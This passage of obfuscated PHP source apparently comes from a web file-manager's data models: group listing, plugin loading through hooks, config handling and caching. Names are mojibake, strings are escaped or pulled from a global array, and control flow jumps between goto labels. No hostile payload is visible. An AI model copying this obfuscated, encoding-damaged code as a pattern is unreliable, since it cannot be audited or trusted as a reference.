$this->_listAppendChildren($f™Óí∏èﬁ©); $this->_listAppendChildrenMember($f™Óí∏èﬁ©); $this->_listAppendMeta($f™Óí∏èﬁ©, $Fƒ∑§è—®•); goto D°ôÜ å∑°; D°ôÜ å∑°: $this->_listAppendParent($f™Óí∏èﬁ©); $this->_listAppendSourceRoot($f™Óí∏èﬁ©, $Fƒ∑§è—®•); goto eØ¿ÈóêﬂÏ; eØ¿ÈóêﬂÏ: } private function _listAppendChildren(&$CõÚÏÕßã≤) { goto DÊ†ÕÍäòŸ; cßø¿Õìêé: $dÕπ¯ÉÉàÉ = array_to_keyvalue($dÕπ¯ÉÉàÉ, $cæõƒÿòÑ¡[446]); foreach ($CõÚÏÕßã≤ as &$AÀßÊî«–À) { $AÀßÊî«–À[$cæõƒÿòÑ¡[2097]] = isset($dÕπ¯ÉÉàÉ[$AÀßÊî«–À[$cæõƒÿòÑ¡[2013]] . $cæõƒÿòÑ¡[2098]]); } goto e¿¯ﬁ∞êÉú; DÊ†ÕÍäòŸ: $cæõƒÿòÑ¡ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Eü û‚Ãùö = $cæõƒÿòÑ¡[358]; $dÕπ¯ÉÉàÉ = array(); goto DÀâÑÎêá≈; DÀâÑÎêá≈: $FââÂñÎ¬î = count($CõÚÏÕßã≤); $bé†±ÀåÃÛ = $this->tablePrefix . $this->tableName; for ($Eùà≈è¯®≠ = 0, $E…å¨â·‹É = 0; $Eùà≈è¯®≠ < $FââÂñÎ¬î; $Eùà≈è¯®≠++) { $E…å¨â·‹É++; $Béæ Û’‡¯ = $CõÚÏÕßã≤[$Eùà≈è¯®≠][$cæõƒÿòÑ¡[2013]]; $Eü û‚Ãùö .= "\x53\105\114\105\103\x54\x20\52\x20\x46\122\x4f\115\x20\50\x53\x45\114\x45\x43\124\40\x27{$Béæ Û’‡¯}\137\143\x68\x69\154\144\47\40\141\x73\40\150\141\163\40\106\x52\x4f\x4d\x20\x60{$bé†±ÀåÃÛ}\x60\40\x77\150\145\162\x65\x20\x70\141\162\x65\x6e\x74\111\104\75{$Béæ Û’‡¯}\40\154\x69\155\x69\164\x20\x31\x29\40\x61\163\40\164\142\137{$Béæ Û’‡¯}\40\165\156\151\x6f\156\40\141\154\154\40"; if (($E…å¨â·‹É >= 20 || $Eùà≈è¯®≠ == $FââÂñÎ¬î - 1) && $Eü û‚Ãùö) { $Eü û‚Ãùö = substr($Eü û‚Ãùö, 0, -strlen($cæõƒÿòÑ¡[445])); $dÒëßçúÒØ = $this->query($Eü û‚Ãùö); $dÕπ¯ÉÉàÉ = array_merge($dÕπ¯ÉÉàÉ, $dÒëßçúÒØ); $E…å¨â·‹É = 0; $Eü û‚Ãùö = $cæõƒÿòÑ¡[33]; } } goto cßø¿Õìêé; e¿¯ﬁ∞êÉú: } private function _listAppendChildrenMember(&$D¶ˆ¶œ⁄Çø) { goto cÆÉä†≠ëÜ; f’ÆÙò áﬁ: $AÇè¥›Éö£ = count($D¶ˆ¶œ⁄Çø); $DáŒ‘Â¿Æ¶ = $this->tablePrefix . $Eí‚ª¬≠ôÑ[2089]; for ($fóâÖÇœ…∆ = 0, $fµ¡ù«ﬁ»Æ = 0; $fóâÖÇœ…∆ < $AÇè¥›Éö£; $fóâÖÇœ…∆++) { $fµ¡ù«ﬁ»Æ++; $d€µﬂÒíÏó = $D¶ˆ¶œ⁄Çø[$fóâÖÇœ…∆][$Eí‚ª¬≠ôÑ[2013]]; $EßÈò¿µ≠≈ .= "\123\x45\x4c\105\103\x54\40\x2a\x20\106\x52\117\115\x20\x28\x53\x45\114\x45\x43\x54\40\x27{$d€µﬂÒíÏó}\x5f\x63\150\151\154\144\x27\x20\x61\163\40\150\x61\163\x20\x46\122\117\115\x20\x60{$DáŒ‘Â¿Æ¶}\x60\40\x77\x68\x65\x72\145\x20\x67\162\157\x75\x70\111\104\75{$d€µﬂÒíÏó}\40\x6c\151\155\x69\x74\x20\61\51\x20\141\163\x20\164\142\137{$d€µﬂÒíÏó}\40\x75\x6e\x69\x6f\156\x20\x61\154\154\40"; if (($fµ¡ù«ﬁ»Æ >= 20 || $fóâÖÇœ…∆ == $AÇè¥›Éö£ - 1) && $EßÈò¿µ≠≈) { $EßÈò¿µ≠≈ = substr($EßÈò¿µ≠≈, 0, -strlen($Eí‚ª¬≠ôÑ[445])); $b±≠ŸøÜô = $this->query($EßÈò¿µ≠≈); $C∫†Ÿê–ºÀ = array_merge($C∫†Ÿê–ºÀ, $b±≠ŸøÜô); $fµ¡ù«ﬁ»Æ = 0; $EßÈò¿µ≠≈ = $Eí‚ª¬≠ôÑ[33]; } } goto C√ö∂ˆœ∫ú; C√ö∂ˆœ∫ú: $C∫†Ÿê–ºÀ = array_to_keyvalue($C∫†Ÿê–ºÀ, $Eí‚ª¬≠ôÑ[446]); foreach ($D¶ˆ¶œ⁄Çø as &$Aë¡£’∞√Ö) { $Aë¡£’∞√Ö[$Eí‚ª¬≠ôÑ[2099]] = isset($C∫†Ÿê–ºÀ[$Aë¡£’∞√Ö[$Eí‚ª¬≠ôÑ[2013]] . $Eí‚ª¬≠ôÑ[2098]]); } goto d§•ı‘∏ŒÎ; cÆÉä†≠ëÜ: $Eí‚ª¬≠ôÑ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EßÈò¿µ≠≈ = $Eí‚ª¬≠ôÑ[358]; $C∫†Ÿê–ºÀ = array(); goto f’ÆÙò áﬁ; d§•ı‘∏ŒÎ: } private function _listAppendMeta(&$dÀÙÏπŸãÑ, $BŒ÷Ï„±â») { $A Ü∂Õòçü =& $_SERVER[£¿ÌÙëü¡¯¯]; $c∏ÛÑäﬂë∂ = array($A Ü∂Õòçü[2013] => array($A Ü∂Õòçü[7], $BŒ÷Ï„±â»)); $D•ÓûŸÜÔî = Model($A Ü∂Õòçü[2088])->where($c∏ÛÑäﬂë∂)->select(); $D•ÓûŸÜÔî = array_to_keyvalue_group($D•ÓûŸÜÔî, $A Ü∂Õòçü[2013]); foreach ($D•ÓûŸÜÔî as &$Eà§áÃ»∂∏) { $Eà§áÃ»∂∏ = array_to_keyvalue($Eà§áÃ»∂∏, $A Ü∂Õòçü[90], $A Ü∂Õòçü[354]); } foreach ($dÀÙÏπŸãÑ as &$Dæ∆ÔËò—í) { $Dæ∆ÔËò—í[$A Ü∂Õòçü[413]] = array(); if (isset($D•ÓûŸÜÔî[$Dæ∆ÔËò—í[$A Ü∂Õòçü[2013]]])) { $Dæ∆ÔËò—í[$A Ü∂Õòçü[413]] = $D•ÓûŸÜÔî[$Dæ∆ÔËò—í[$A Ü∂Õòçü[2013]]]; } } } protected function parentLevelArray($AÚÈ¬¬Ö—¶) { $eßÀ∆∆¥Ôˆ =& $_SERVER[£¿ÌÙëü¡¯¯]; $AÚÈ¬¬Ö—¶ = explode($eßÀ∆∆¥Ôˆ[47], trim($AÚÈ¬¬Ö—¶, $eßÀ∆∆¥Ôˆ[47])); $AÚÈ¬¬Ö—¶ = array_remove_value($AÚÈ¬¬Ö—¶, $eßÀ∆∆¥Ôˆ[464]); return $AÚÈ¬¬Ö—¶; } private function _listAppendParent(&$b÷çπÉ•æ ) { goto f·π¯◊€ê; Bç´›¬∫⁄˜: $bµ”éúâÛœ = array(); foreach ($A‡±≈»Ü¯§ as $A‚ÇØßàîŒ => $Aî¶≈πË¯€) { if (!$Aî¶≈πË¯€) { $bµ”éúâÛœ[] = $A‚ÇØßàîŒ; } } if ($bµ”éúâÛœ) { $få¥Ùß¨„â = array($d∞ë•°ﬂçå[2087] => array($d∞ë•°ﬂçå[381], $bµ”éúâÛœ)); $cŸòôéé—ô = $this->field($d∞ë•°ﬂçå[2100])->where($få¥Ùß¨„â)->select(); $C‘°ä…◊˜π = array_to_keyvalue($cŸòôéé—ô, $d∞ë•°ﬂçå[2013], $d∞ë•°ﬂçå[28]); $A‡±≈»Ü¯§ = array_merge_index($A‡±≈»Ü¯§, $C‘°ä…◊˜π); } goto eÖæ¢Óöã›; f·π¯◊€ê: $d∞ë•°ﬂçå =& $_SERVER[£¿ÌÙëü¡¯¯]; $A‡±≈»Ü¯§ = array(); foreach ($b÷çπÉ•æ  as &$B≠Ÿ„¬¢âè) { $A‡±≈»Ü¯§[$B≠Ÿ„¬¢âè[$d∞ë•°ﬂçå[2013]]] = $B≠Ÿ„¬¢âè[$d∞ë•°ﬂçå[28]]; $EÍΩ·Â÷Ö’ = $this->parentLevelArray($B≠Ÿ„¬¢âè[$d∞ë•°ﬂçå[455]]); foreach ($EÍΩ·Â÷Ö’ as $AÌí≤õ˘àã) { if (!isset($A‡±≈»Ü¯§[$AÌí≤õ˘àã])) { $A‡±≈»Ü¯§[$AÌí≤õ˘àã] = 0; } } } goto Bç´›¬∫⁄˜; eÖæ¢Óöã›: foreach ($b÷çπÉ•æ  as &$B≠Ÿ„¬¢âè) { $EÍΩ·Â÷Ö’ = $this->parentLevelArray($B≠Ÿ„¬¢âè[$d∞ë•°ﬂçå[455]]); $Cïîï”ù‰¯ = $d∞ë•°ﬂçå[33]; foreach ($EÍΩ·Â÷Ö’ as $AÌí≤õ˘àã) { $Cïîï”ù‰¯ .= $A‡±≈»Ü¯§[$AÌí≤õ˘àã] . $d∞ë•°ﬂçå[8]; } if ($EÍΩ·Â÷Ö’) { $Cïîï”ù‰¯ .= $B≠Ÿ„¬¢âè[$d∞ë•°ﬂçå[28]]; } $B≠Ÿ„¬¢âè[$d∞ë•°ﬂçå[459]] = str_replace($d∞ë•°ﬂçå[463], $d∞ë•°ﬂçå[8], $Cïîï”ù‰¯); } goto d“Ê∑ã∫≤Ÿ; d“Ê∑ã∫≤Ÿ: } private function _listAppendSourceRoot(&$AâèŸÉ¯÷, $b≠Ÿ”¥ŒÒ⁄) { goto DπÂŸ·î…Â; D¡óÖ√îΩó: $b”Â…€ÕÓã = Model($aÀﬁõíÕ¬ø[749])->order($aÀﬁõíÕ¬ø[2102])->field($cãΩåîﬁ∑ﬁ)->where($F¡åìÏπÇ√)->select(); $b”Â…€ÕÓã = array_to_keyvalue($b”Â…€ÕÓã, $aÀﬁõíÕ¬ø[452]); $b”Â…€ÕÓã = array_remove_key($b”Â…€ÕÓã, $aÀﬁõíÕ¬ø[452]); goto eÓ¯À¢‡°ø; DπÂŸ·î…Â: $aÀﬁõíÕ¬ø =& $_SERVER[£¿ÌÙëü¡¯¯]; $F¡åìÏπÇ√ = array($aÀﬁõíÕ¬ø[368] => SourceModel::TYPE_GROUP, $aÀﬁõíÕ¬ø[457] => 0, $aÀﬁõíÕ¬ø[452] => array($aÀﬁõíÕ¬ø[7], $b≠Ÿ”¥ŒÒ⁄)); $cãΩåîﬁ∑ﬁ = $aÀﬁõíÕ¬ø[2101]; goto D¡óÖ√îΩó; eÓ¯À¢‡°ø: foreach ($AâèŸÉ¯÷ as &$FÓü£¨È…–) { $FÓü£¨È…–[$aÀﬁõíÕ¬ø[388]] = $b”Â…€ÕÓã[$FÓü£¨È…–[$aÀﬁõíÕ¬ø[2013]]] ? $b”Â…€ÕÓã[$FÓü£¨È…–[$aÀﬁõíÕ¬ø[2013]]] : array(); } goto Fë¨∫ç¬ú‡; Fë¨∫ç¬ú‡: } protected function resetParentLevel() { $e˜é´ªÜÕÿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $BÁ≠ŸÔ∞î¿ = $e˜é´ªÜÕÿ[2013]; $B±ÀöÏüﬂí = $this->select(); $B±ÀöÏüﬂí = array_to_keyvalue($B±ÀöÏüﬂí, $BÁ≠ŸÔ∞î¿); foreach ($B±ÀöÏüﬂí as $Bëπ∑Ö‰„ù) { goto B•à˜ò⁄®°; B•à˜ò⁄®°: $C≈”öÀë€™ = $Bëπ∑Ö‰„ù; $C–ﬂ–Ó‡£ı = array(); while ($C≈”öÀë€™[$e˜é´ªÜÕÿ[457]] != 0) { $C–ﬂ–Ó‡£ı[] = $C≈”öÀë€™[$e˜é´ªÜÕÿ[457]]; $C≈”öÀë€™ = $B±ÀöÏüﬂí[$C≈”öÀë€™[$e˜é´ªÜÕÿ[457]]]; } goto B¶ÜŒ≥§¶›; cÙ∫áäˆÑ–: $this->where(array($BÁ≠ŸÔ∞î¿ => $Bëπ∑Ö‰„ù[$BÁ≠ŸÔ∞î¿]))->save(array($e˜é´ªÜÕÿ[517] => $C–ﬂ–Ó‡£ı)); goto dÆ≈öäÆ¯É; B¶ÜŒ≥§¶›: $C–ﬂ–Ó‡£ı[] = 0; $C–ﬂ–Ó‡£ı = $e˜é´ªÜÕÿ[47] . implode($e˜é´ªÜÕÿ[47], array_reverse($C–ﬂ–Ó‡£ı)) . $e˜é´ªÜÕÿ[47]; $this->setNamePinyin($Bëπ∑Ö‰„ù[$BÁ≠ŸÔ∞î¿], $Bëπ∑Ö‰„ù[$e˜é´ªÜÕÿ[28]]); goto cÙ∫áäˆÑ–; dÆ≈öäÆ¯É: } return $B±ÀöÏüﬂí; } public function groupNameAuto($EäÂå«Êø˘, $fÚ°Ë’Ñ∑…) { $bñÊø®ûë‰ =& $_SERVER[£¿ÌÙëü¡¯¯]; $BÕï©∫ÑÖÈ = $this->where(array($bñÊø®ûë‰[365] => $EäÂå«Êø˘))->getField($bñÊø®ûë‰[28], !0); if (!$BÕï©∫ÑÖÈ || !in_array($fÚ°Ë’Ñ∑…, $BÕï©∫ÑÖÈ)) { return $fÚ°Ë’Ñ∑…; } for ($eÍ„€ŒÖˆÖ = 1; $eÍ„€ŒÖˆÖ <= count($BÕï©∫ÑÖÈ) + 1; $eÍ„€ŒÖˆÖ++) { $d©≠∂ÇﬂÈ§ = $fÚ°Ë’Ñ∑… . "\50{$eÍ„€ŒÖˆÖ}\51"; if (!in_array($d©≠∂ÇﬂÈ§, $BÕï©∫ÑÖÈ)) { return $d©≠∂ÇﬂÈ§; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\160\154\x75\147\151\x6e\x4c\151\x73\x74"; public $field = array("\156\x61\155\x65", "\x73\x74\x61\164\165\x73", "\x72\145\x67\151\x65\163\x74", "\143\157\x6e\x66\151\147"); public function loadList($bœàÖ¶ìØ = false) { $f¶⁄ì≈ë◊ = array_to_keyvalue($this->listData(), $_SERVER[£¿ÌÙëü¡¯¯][28]); if ($bœàÖ¶ìØ) { return $f¶⁄ì≈ë◊[$bœàÖ¶ìØ]; } return $f¶⁄ì≈ë◊; } public function init() { $aØ•óŒéΩ„ =& $_SERVER[£¿ÌÙëü¡¯¯]; Hook::trigger($aØ•óŒéΩ„[2103]); $Fœ©é∂ÊÑ‹ = $this->loadPluginList(); foreach ($Fœ©é∂ÊÑ‹ as $DÕÑ’˘ôÂ— => $Bùßüçñ¢Ö) { $b’Ûù»ãÜ = $this->appAllow($DÕÑ’˘ôÂ—, $Bùßüçñ¢Ö); if (!$b’Ûù»ãÜ) { continue; } foreach ($Bùßüçñ¢Ö[$aØ•óŒéΩ„[2104]] as $a≥°œ∆èåÀ => $f¥»ÈåÉ) { Hook::bind($a≥°œ∆èåÀ, $f¥»ÈåÉ); } } Hook::trigger($aØ•óŒéΩ„[2105]); Hook::trigger(ACTION); } public function appAllow($f÷¶≤ãõ‚≤, $A“¡≈¢Ü∏Ú, $c˘î∂äìƒ® = true) { $b™Ú©ÿÈ⁄† =& $_SERVER[£¿ÌÙëü¡¯¯]; $bÉêèèò«ã = PLUGIN_DIR . $f÷¶≤ãõ‚≤ . $b™Ú©ÿÈ⁄†[2106]; if (!is_array($A“¡≈¢Ü∏Ú) || !is_array($A“¡≈¢Ü∏Ú[$b™Ú©ÿÈ⁄†[2104]]) || !is_file($bÉêèèò«ã) || $A“¡≈¢Ü∏Ú[$b™Ú©ÿÈ⁄†[676]] != 1) { return !1; } if ($c˘î∂äìƒ® && !Action($b™Ú©ÿÈ⁄†[2107])->checkAuth($f÷¶≤ãõ‚≤)) { return !1; } return !0; } public function unInstall($cıﬂòÖ“˘Ø) { $b»‰ãØ≤û· =& $_SERVER[£¿ÌÙëü¡¯¯]; $aã“⁄‰∆è´ = $this->loadList($cıﬂòÖ“˘Ø); if (file_exists(PLUGIN_DIR . $cıﬂòÖ“˘Ø)) { Hook::apply($cıﬂòÖ“˘Ø . $b»‰ãØ≤û·[2108]); } $this->remove($aã“⁄‰∆è´[$b»‰ãØ≤û·[364]]); } public function changeStatus($e¨àåÌ‚©æ, $BùèÉö”Üπ) { $DÕ´‡ìœ¶ÿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $d »»Í ¡Î = $this->loadList($e¨àåÌ‚©æ); if ($BùèÉö”Üπ) { Hook::apply($e¨àåÌ‚©æ . $DÕ´‡ìœ¶ÿ[2109]); } $this->update($d »»Í ¡Î[$DÕ´‡ìœ¶ÿ[364]], array($DÕ´‡ìœ¶ÿ[2110] => $BùèÉö”Üπ)); } public function appRegist($bÏÈ¡ª√œ√, $dÔÑÍƒ»ÎÍ) { $D‡≤ö‰ áö =& $_SERVER[£¿ÌÙëü¡¯¯]; $FÖ£Î·‚’´ = $this->loadList($bÏÈ¡ª√œ√); if ($FÖ£Î·‚’´) { $this->update($FÖ£Î·‚’´[$D‡≤ö‰ áö[364]], array($D‡≤ö‰ áö[2104] => $dÔÑÍƒ»ÎÍ)); } else { $DˆËàìıÙ• = array($D‡≤ö‰ áö[28] => $bÏÈ¡ª√œ√, $D‡≤ö‰ áö[2104] => $dÔÑÍƒ»ÎÍ, $D‡≤ö‰ áö[676] => 0, $D‡≤ö‰ áö[6] => $this->getConfigDefault($bÏÈ¡ª√œ√)); $this->insert($DˆËàìıÙ•); } } public function getConfigDefault($E›ú†¢ﬁ¿÷) { $dœ‹®Ò≥≤Ñ =& $_SERVER[£¿ÌÙëü¡¯¯]; $cçÈ€Œüø¬ = array(); $FàªôéùíÃ = $this->getPackageJson($E›ú†¢ﬁ¿÷); if (!$FàªôéùíÃ && is_array($FàªôéùíÃ[$dœ‹®Ò≥≤Ñ[2111]])) { return $cçÈ€Œüø¬; } foreach ($FàªôéùíÃ[$dœ‹®Ò≥≤Ñ[2111]] as $c∫°π¨©ú• => $B∑Ô®≈Ø∂ﬁ) { if (!isset($B∑Ô®≈Ø∂ﬁ[$dœ‹®Ò≥≤Ñ[354]]) || isset($cçÈ€Œüø¬[$c∫°π¨©ú•])) { continue; } $cçÈ€Œüø¬[$c∫°π¨©ú•] = $B∑Ô®≈Ø∂ﬁ[$dœ‹®Ò≥≤Ñ[354]]; } return $cçÈ€Œüø¬; } public function getPackageJson($F‰ ‚â¨âó) { return Hook::apply($F‰ ‚â¨âó . $_SERVER[£¿ÌÙëü¡¯¯][2112]); } public function getConfig($dËÁ‘´õÈΩ, $c¢∑ã”öË† = false) { $d‘˘∑”Ç À =& $_SERVER[£¿ÌÙëü¡¯¯]; $fÑâàá‡±¥ = array(); $Cﬂà⁄ñ™âü = $this->loadList($dËÁ‘´õÈΩ); if ($Cﬂà⁄ñ™âü && is_array($Cﬂà⁄ñ™âü[$d‘˘∑”Ç À[6]])) { $fÑâàá‡±¥ = $Cﬂà⁄ñ™âü[$d‘˘∑”Ç À[6]]; } if (!$fÑâàá‡±¥ || $c¢∑ã”öË†) { $fÑâàá‡±¥ = $this->getConfigDefault($dËÁ‘´õÈΩ); } return $fÑâàá‡±¥; } public function setConfig($aãπâ¥÷≈Ω, $D€¿Ì¥®» = false) { goto díÁÒ¬áÇ∏; díÁÒ¬áÇ∏: $Cê∞ÒÕ‚©• =& $_SERVER[£¿ÌÙëü¡¯¯]; $f£ˆàê˘µƒ = $this->loadList($aãπâ¥÷≈Ω); if (!$f£ˆàê˘µƒ) { return !1; } goto dŒ‰Ê“§Òı; dŒ‰Ê“§Òı: if ($D€¿Ì¥®» == !1) { $D€¿Ì¥®» = $this->getConfigDefault($aãπâ¥÷≈Ω); } $Eç∞Éóæü¬ = $f£ˆàê˘µƒ[$Cê∞ÒÕ‚©•[6]]; foreach ($D€¿Ì¥®» as $FØ≈√”¥âä => $C®–∞¡Ñ≤É) { $Eç∞Éóæü¬[$FØ≈√”¥âä] = is_string($C®–∞¡Ñ≤É) ? trim($C®–∞¡Ñ≤É) : $C®–∞¡Ñ≤É; } goto c£€¿±ÑÆá; c£€¿±ÑÆá: $this->update($f£ˆàê˘µƒ[$Cê∞ÒÕ‚©•[364]], array($Cê∞ÒÕ‚©•[6] => $Eç∞Éóæü¬)); goto fëíãë≥ˆ≈; fëíãë≥ˆ≈: } public function viewList() { goto BòÒ……ÙçÂ; bü§€∞èãÁ: $dÁï±˘¯Œö = $this->loadPluginList(); $A“û‡ï≈π÷ = array(); foreach ($dÁï±˘¯Œö as $B“ﬂ„ÈÉµ° => $aíƒãáÃ€¨) { unset($aíƒãáÃ€¨[$E∆âÓª≠á∂[2104]], $aíƒãáÃ€¨[$E∆âÓª≠á∂[6]]); $dƒä⁄Á√®∑ = PLUGIN_DIR . $aíƒãáÃ€¨[$E∆âÓª≠á∂[28]] . $E∆âÓª≠á∂[2106]; if (!is_file($dƒä⁄Á√®∑)) { continue; } $Fò›äëÈ›Ñ = Hook::apply($aíƒãáÃ€¨[$E∆âÓª≠á∂[28]] . $E∆âÓª≠á∂[2112]); if (is_array($Fò›äëÈ›Ñ)) { $A“û‡ï≈π÷[$B“ﬂ„ÈÉµ°] = array_merge($aíƒãáÃ€¨, $Fò›äëÈ›Ñ); } } goto D´é‘Á•ìº; BòÒ……ÙçÂ: $E∆âÓª≠á∂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $dÁï±˘¯Œö = $this->loadList(); $this->pluginScan($dÁï±˘¯Œö); goto bü§€∞èãÁ; D´é‘Á•ìº: return $A“û‡ï≈π÷; goto b¶˘äÌﬂﬂß; b¶˘äÌﬂﬂß: } private function loadPluginList() { $DÛ«æÃêÉ =& $_SERVER[£¿ÌÙëü¡¯¯]; $CèÁÇ•¥ªÑ = $this->loadList(); if (strtolower(MOD) == $DÛ«æÃêÉ[2113]) { $bëÑ∆°ê–ﬁ = $CèÁÇ•¥ªÑ; } else { $bëÑ∆°ê–ﬁ = Hook::trigger($DÛ«æÃêÉ[2114], $CèÁÇ•¥ªÑ); if (!$bëÑ∆°ê–ﬁ) { die; } } return $bëÑ∆°ê–ﬁ; } private function pluginScan($C≈òÂﬁ¬À„) { $cëßË±êù =& $_SERVER[£¿ÌÙëü¡¯¯]; recursion_dir(PLUGIN_DIR, $DáµÇ‡È¥Ú, $EŸåü±‡Ìâ, 0); foreach ($DáµÇ‡È¥Ú as $DŸ∏ëÒÖÖú) { $C∑í≤ÉÃ’Ï = get_path_this($DŸ∏ëÒÖÖú); if (isset($C≈òÂﬁ¬À„[$C∑í≤ÉÃ’Ï]) || !file_exists($DŸ∏ëÒÖÖú . $cëßË±êù[2115]) || !file_exists($DŸ∏ëÒÖÖú . $cëßË±êù[2106])) { continue; } Hook::apply($C∑í≤ÉÃ’Ï . $cëßË±êù[2109]); } } } goto B◊ß»Èá–Ç; B‘≤ê¢ »ÿ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\146\x79\124\x69\x6d\x65", "\164\x69\x6d\145", "\x69\x6e\163\x65\x72\x74\x2c\165\x70\144\x61\164\145", "\x66\165\156\x63\x74\151\157\156"), array("\143\x72\x65\x61\164\x65\x54\151\x6d\x65", "\164\151\x6d\x65", "\x69\x6e\x73\x65\x72\x74", "\x66\165\156\143\164\151\157\156")); public function setDataAuto($DˆáÊ‘ˆ≈–) { $this->dataAuto = $DˆáÊ‘ˆ≈–; } public function __construct($eØÈå—ä≥– = '', $cÑæ…Õ◊çÌ = '', $F©Öö—Íä¬ = '') { parent::__construct($eØÈå—ä≥–, $cÑæ…Õ◊çÌ, $F©Öö—Íä¬); } public static function textEncode($C¯ﬁ‘–≥‘ê) { if (!$C¯ﬁ‘–≥‘ê) { return $C¯ﬁ‘–≥‘ê; } $e±•é˜€Í≈ = json_encode($C¯ﬁ‘–≥‘ê); $e±•é˜€Í≈ = preg_replace_callback($_SERVER[£¿ÌÙëü¡¯¯][338], function ($BÃúº‰”òÌ) { return addslashes($BÃúº‰”òÌ[0]); }, $e±•é˜€Í≈); return json_decode($e±•é˜€Í≈); } public static function textDecode($a≈† í†òü) { $B’°∑ƒÇÊﬂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $BÇ¨Õñ∞¢≥ = json_encode($a≈† í†òü); $BÇ¨Õñ∞¢≥ = preg_replace_callback($B’°∑ƒÇÊﬂ[339], function ($B“â¥ºÓ´ï) { return $_SERVER[£¿ÌÙëü¡¯¯][96]; }, $BÇ¨Õñ∞¢≥); return json_decode($BÇ¨Õñ∞¢≥); } protected $tableMeta = array(); protected function _beforeInsert(&$b’üçˆø¢≤, $dˆ àÎ˘™ÿ) { $FêŒíåçãΩ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->checkDataAutoHas($FêŒíåçãΩ[340])) { return; } $this->dataBeforeFilter($b’üçˆø¢≤, $FêŒíåçãΩ[340]); } protected function _beforeUpdate(&$dœ»‡©ÿª≤, $E∫“ñﬁŒÆç) { $b∂Ç‡◊ØÌ≈ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->checkDataAutoHas($b∂Ç‡◊ØÌ≈[341])) { return; } $this->dataBeforeFilter($dœ»‡©ÿª≤, $b∂Ç‡◊ØÌ≈[341]); } protected function _afterSelect(&$f›¬âÊ◊ùû, $DÊ‘≥™≤Òç) { if (!is_array($f›¬âÊ◊ùû)) { return; } if (!$this->checkDataAutoHas($_SERVER[£¿ÌÙëü¡¯¯][342])) { return; } foreach ($f›¬âÊ◊ùû as &$DäÖñÛö§◊) { $this->dataAfterFilter($DäÖñÛö§◊); } } protected function _afterFind(&$aŒ¥˘ã›ñ∞, $FÕòØæêŒ’) { if (!is_array($aŒ¥˘ã›ñ∞)) { return; } if (!$this->checkDataAutoHas($_SERVER[£¿ÌÙëü¡¯¯][342])) { return; } $this->dataAfterFilter($aŒ¥˘ã›ñ∞); } public function setAutoIncrement($DÌÔäßÖŒª) { $A°ÓÔˆÇÇü = array($this->getPk() => $DÌÔäßÖŒª); $Bπ‘ÜÇ’Ç  = $this->data($A°ÓÔˆÇÇü)->add(); if ($Bπ‘ÜÇ’Ç ) { $this->delete($Bπ‘ÜÇ’Ç ); } } public function getAutoIncrement() { $c©ÆåÃÈ“Ÿ = $this->getTableName(); $Bô»⁄¿ÔΩî = $this->max($this->getPk()); $C¨ˆÑ√√êú = $this->query("\x73\150\x6f\x77\40\164\x61\x62\x6c\145\40\x73\x74\141\x74\x75\163\40\x77\150\145\162\x65\x20\116\141\x6d\145\x3d\47{$c©ÆåÃÈ“Ÿ}\x27"); $f‘“’Í∫Ëç = $C¨ˆÑ√√êú[0][$_SERVER[£¿ÌÙëü¡¯¯][343]]; $B‹ß¥‘ùÔê = max($Bô»⁄¿ÔΩî, $f‘“’Í∫Ëç); return $B‹ß¥‘ùÔê; } protected function _callBefore($c·É∫ÒÇàé, $FÏ√á∞Ã„∂) { return $this->cacheCallCheck($c·É∫ÒÇàé, $FÏ√á∞Ã„∂, !1); } protected function _callAfter($bïﬁÂ€õ·ñ, $Dÿ÷öø∞ºö) { return $this->cacheCallCheck($bïﬁÂ€õ·ñ, $Dÿ÷öø∞ºö, !0); } protected function cacheFunctionAlias($cç≤¨⁄∞≥é) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($FÉÊÂÔˆ“Î, $bÒ¿é®áôı, $FâïÌˆìÚı = false) { $C–∆“ÍÛ√£ = $this->cacheFunctionAlias($bÒ¿é®áôı); if (!$C–∆“ÍÛ√£) { return; } foreach ($C–∆“ÍÛ√£ as $fËØ©ªÜÑ± => $fñ¥Ü¬∆±») { $CŒˆ¿‚Â¯¥ = $fñ¥Ü¬∆±»[0]; $dó›¢ûíãË = explode($_SERVER[£¿ÌÙëü¡¯¯][47], $fñ¥Ü¬∆±»[1]); if ($FÉÊÂÔˆ“Î == $fËØ©ªÜÑ±) { return $this->cacheFunctionGet($fËØ©ªÜÑ±, $CŒˆ¿‚Â¯¥); } if ($FâïÌˆìÚı && in_array($FÉÊÂÔˆ“Î, $dó›¢ûíãË)) { $this->cacheFunctionClear($fËØ©ªÜÑ±, $CŒˆ¿‚Â¯¥); } } } public function cacheFunctionGet($B⁄â÷øÍÎª, $BÀÂà÷¥‘…) { $bÒŸÏÉöÖú = $this->cacheKeyMake($B⁄â÷øÍÎª, $BÀÂà÷¥‘…); $eñêáçœé™ = Cache::get($bÒŸÏÉöÖú); if (!is_array($eñêáçœé™)) { $eñêáçœé™ = call_user_func_array(array($this, $B⁄â÷øÍÎª), array($BÀÂà÷¥‘…, !0)); Cache::set($bÒŸÏÉöÖú, $eñêáçœé™); } return $eñêáçœé™; } public function cacheFunctionClear($cêÈùëÀ¨—, $dÓ∏µØºµ˘) { $A≈¨ã¯ÛãÒ = $dÓ∏µØºµ˘; if (!is_array($dÓ∏µØºµ˘)) { $A≈¨ã¯ÛãÒ = array($dÓ∏µØºµ˘); } foreach ($A≈¨ã¯ÛãÒ as $B å¡§ı—ƒ) { $F÷ïñÀö°‚ = $this->cacheKeyMake($cêÈùëÀ¨—, $B å¡§ı—ƒ); Cache::remove($F÷ïñÀö°‚); } } private function cacheKeyMake($EÉƒëÖ§ΩÇ, $eÎ›∂Ò‡§“) { $fÑ£Ò§ŸÑÀ =& $_SERVER[£¿ÌÙëü¡¯¯]; return get_class($this) . $fÑ£Ò§ŸÑÀ[71] . $EÉƒëÖ§ΩÇ . $fÑ£Ò§ŸÑÀ[344] . $eÎ›∂Ò‡§“; } protected function selectPage($Cëß—ÎèçÜ = 200, $aàƒ£◊òîí = 1) { goto E±Üê≈ëºè; 